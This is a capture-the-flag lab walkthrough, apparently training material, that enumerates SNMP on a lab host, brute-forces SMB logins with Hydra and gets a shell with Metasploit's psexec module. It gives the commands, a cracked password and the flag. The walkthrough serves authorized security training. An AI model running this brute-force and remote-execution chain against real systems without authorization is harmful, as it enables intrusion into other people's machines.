In this lab, you will learn to scan the target machine to discover SNMP service and perform information gathering using SNMP nmap scripts and other tools.

# Lab Environment

In this lab environment, the user will get access to a Kali GUI instance. An instance of the vulnerable service can be accessed using the tools installed on Kali at [http://demo.ine.local]

**Objective:** Exploit the target to gain the shell and find the flag!

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework
- snmpwalk
- Hydra

---

Please go ahead ONLY if you have COMPLETED the lab or you are stuck! Checking the solutions before actually trying the concepts and techniques you studied in the course will dramatically reduce the benefits of a hands-on lab!

______



**Step 1:** Open the lab link to access the Kali GUI instance.

![Content Image](https://assets.ine.com/lab/learningpath/2b81f7929bd437c6f984950e004bd75d5e957fd579cfb0ea9a017e144bc450df.jpg)

**Step 2:** Check if the machine/domain is reachable.

**Command:**

```
ping -c 5 demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/1ab40e73f6a6a63f37a602f320ca2e017e5ebfc0f354a661c4895bfad7e1d2d8.jpg)

The machine is reachable.

**Step 3:** Check open ports on the machine.

**Command:**

```
nmap demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/dbac1b71b10981bbacf99a4c7ec4b83ba4e05bcfb4a7ff93c74c1e9ee256c996.jpg)

We can notice, multiple ports are open on the target machine.

**Step 4:** Now, let's check if the SNMP port is open or not

We must keep in mind that nmap does not check for UDP ports by default. As we already know, SNMP runs on the UDP port 161.

Therefore, let's check if this specific is opened.

**Command:**

```
nmap -sU -p 161 demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/f5c7c0e7f66ec740b243932f4d33ce6bab1d8b447ea20e1f693fa09d82b839dc.jpg)

As we can see, the UDP port 161 is open. This information is crucial for our following tasks.

**Note:** We will have to double-check nmap results by sending SNMP requests to the host and checking if we get responses from both. Sometimes, when host-based firewalls protect the hosts, they may confuse the nmap scan results.

**Step 5:** Now, we need to find the SNMP server community string to access the target machine service.

First, we need to discover the community strings to access the SNMP service.

Note: If you are not familiar with SNMP terms like communities, please, take a look at the course material.

We could use nmap `snmp-brute` script to find the community string. The script uses the `snmpcommunities.lst` list for brute-forcing it is located inside `/usr/share/nmap/nselib/data/snmpcommunities.lst` directory.

**Command:**

```
nmap -sU -p 161 --script=snmp-brute demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/2df3148bdf3ce5b10b37281548eeaa6ea59d08fb4979598549508d8e67ea6414.jpg)

As we can see, we found three community names: public, private, and secret.

**Step 6:** Now, let's run the snmpwalk tool to find all the information via SNMP.

**snmpwalk:** snmpwalk is an SNMP application that uses SNMP GETNEXT requests to query a network entity for a tree of information. An object identifier (OID) may be given on the command line. This OID specifies which portion of the object identifier space will be searched using GETNEXT requests. All variables in the subtree below the given OID are queried and their values presented to the user. Each variable name is given in the format specified in variables. If no OID argument is present, snmpwalk will search the subtree rooted at SNMPv2-SMI::mib-2 (including any MIB object values from other MIB modules, that are defined as lying within this subtree). If the network entity has an error processing the request packet, an error packet will be returned and a message will be shown, helping to pinpoint why the request was malformed. If the tree search causes attempts to search beyond the end of the MIB, the message "End of MIB" will be displayed. Source [https://linux.die.net/man/1/snmpwalk]

We are running the snmpwalk command on the target machine.

**Command:**

```
snmpwalk -v 1 -c public demo.ine.local
```

`-v`: Specifies SNMP version to use

`-c`: Set the community string

![Content Image](https://assets.ine.com/lab/learningpath/3d358dc29875e739eaf997093d2cd938cd1d958657c5d85d2fcac74f1bc340ed.jpg)

We were able to gather a lot of information via SNMP. But, this isn't in a proper readable format. We need to take the help of other tools, i.e., nmap SNMP scripts, for specific information.

**Step 7:** Let's run all the SNMP nmap scripts to gather all possible information via the SNMP service.

**Command:**

```
nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
ls
```

The above command would run all the nmap SNMP scripts on the target machine and store its output to the `snmp_output` file.

![Content Image](https://assets.ine.com/lab/learningpath/85f9d109f8e0c65d743edfdf42e2100898b2119dcf602541327609364b4fd556.jpg)

This nmap script scan would take some time. Please wait patiently.

From the list of information retrieved, we found a couple of engaging data, such as running processes, users, services, installed applications, etc.

However, analyzing the results, one absorbing information we could extract is the list of Windows users:

![Content Image](https://assets.ine.com/lab/learningpath/c5b0239dc512c850597875452e277ecea3cc64c88bcc6865115ea6dc31ad2c97.jpg)

**Step 8:** Now, let's run a brute-force attack using these windows users on SMB service.

Remember, port 445 is open, and we can run a brute-force attack using the hydra tool.

First, let's save two usernames in a file. i.e `administrator` and `admin`.

![Content Image](https://assets.ine.com/lab/learningpath/df77ee7ac113830ded094030b5a7b5e9bb9638872ed0c814bfa4507bb3ca72f6.jpg)

**Command:**

```
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
```

The hydra switches are described in the help: hydra -help. However, the most relevant parts of the command are explained below:

- `-L users.txt`: This is the dictionary file containing a list of users.
    
- `-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`: This tells hydra to use a dictionary file containing a list of known passwords. This particular file (unix_passwords.txt) belongs to "Metasploit Framework"
    
- `demo.ine.local`: The target
    
- `smb`: This is the protocol that should be used by hydra to perform the brute-force attack.
    

After a couple of minutes, we should see the following results:

![Content Image](https://assets.ine.com/lab/learningpath/ff4d9e2fad463e0b6e56acb4f2ec5c84254e272a27a38bce2b479b1185a58f5c.jpg)

Thus, hydra successfully found a valid password for `administrator` and `admin` users.

**Step 9:** Now, we will run the `psexec` Metasploit exploit module to gain the meterpreter session using these credentials.

Let's try to get a shell on this system using the PSExec module of the Metasploit framework.

**PSExec (Microsoft Windows Authenticated User Code Execution)**: This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description. Source: [https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/]

**Commands:**

```
msfconsole -q
use exploit/windows/smb/psexec
show options
```

![Content Image](https://assets.ine.com/lab/learningpath/c3f4c55bab82977d6f00532bc75226753b68d2da7dda55c40945148838281818.jpg)

![Content Image](https://assets.ine.com/lab/learningpath/cd44125f0d8bb3c508c17253908c0763a9c559801713a5c9cf0e5e6fff2c561d.jpg)

As we can see, we have to set RHOSTS, SMBUSER, and SMBPASS. Rest all other essential values, i.e. PAYLOAD, and LHOST, is already set.

Let's set all these values and exploit the target.

**Commands:**

```
set RHOSTS demo.ine.local
set SMBUSER administrator
set SMBPASS elizabeth
exploit
```

**Note:** If you don't gain a meterpreter session for some reason, please re-exploit the target.

![Content Image](https://assets.ine.com/lab/learningpath/7539e70dbb34cc1ae3b5983eefb57602c2a3f89d137e28d906a28bdc3409cb16.jpg)

We have successfully gained the meterpreter session on the target machine.

**Step 10:** Now, let's read the flag.

**Commands:**

```
shell
cd C:\
dir
type FLAG1.txt
```

![Content Image](https://assets.ine.com/lab/learningpath/a7c371e695eea12665e7776bd689c0c274453b2e8eafd977e56306e3ada26ab0.jpg)

**FLAG:** a8f5f167f44f4964e6c998dee827110c

We have found the flag!

We have successfully exploited the target machine by extracting information via the SNMP service.